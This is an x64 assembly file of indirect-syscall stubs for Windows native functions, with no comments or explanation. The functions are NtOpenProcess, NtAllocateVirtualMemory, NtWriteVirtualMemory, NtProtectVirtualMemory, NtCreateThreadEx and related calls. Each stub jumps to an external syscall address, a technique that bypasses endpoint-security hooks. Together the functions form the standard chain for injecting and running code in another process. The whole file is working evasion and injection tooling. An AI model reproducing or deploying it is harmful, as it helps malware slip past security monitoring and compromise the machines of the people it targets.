.data 
extern g_NtOpenProcessSSN:DWORD
extern g_NtAllocateVirtualMemorySSN:DWORD
extern g_NtWriteVirtualMemorySSN:DWORD
extern g_NtProtectVirtualMemorySSN:DWORD
extern g_NtCreateThreadExSSN:DWORD
extern g_NtWaitForSingleObjectSSN:DWORD
extern g_NtFreeVirtualMemorySSN:DWORD
extern g_NtCloseSSN:DWORD

extern g_Mysyscall:QWORD


.code
NtOpenProcess proc
		mov r10, rcx
		mov eax, g_NtOpenProcessSSN       
		jmp qword ptr g_Mysyscall                         
		ret                             
NtOpenProcess endp

NtAllocateVirtualMemory proc
		mov r10, rcx
		mov eax, g_NtAllocateVirtualMemorySSN      
		jmp qword ptr g_Mysyscall                        
		ret                             
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
		mov r10, rcx
		mov eax, g_NtWriteVirtualMemorySSN      
		jmp qword ptr g_Mysyscall                        
		ret                             
NtWriteVirtualMemory endp

NtProtectVirtualMemory proc
		mov r10, rcx
		mov eax, g_NtProtectVirtualMemorySSN       
		jmp qword ptr g_Mysyscall                         
		ret                             
NtProtectVirtualMemory endp

NtCreateThreadEx proc
		mov r10, rcx
		mov eax, g_NtCreateThreadExSSN      
		jmp qword ptr g_Mysyscall                        
		ret                             
NtCreateThreadEx endp

NtWaitForSingleObject proc
		mov r10, rcx
		mov eax, g_NtWaitForSingleObjectSSN      
		jmp qword ptr g_Mysyscall                        
		ret                             
NtWaitForSingleObject endp

NtFreeVirtualMemory proc
		mov r10, rcx
		mov eax, g_NtFreeVirtualMemorySSN      
		jmp qword ptr g_Mysyscall                        
		ret                             
NtFreeVirtualMemory endp

NtClose proc
		mov r10, rcx
		mov eax, g_NtCloseSSN      
		jmp qword ptr g_Mysyscall                        
		ret                             
NtClose endp
end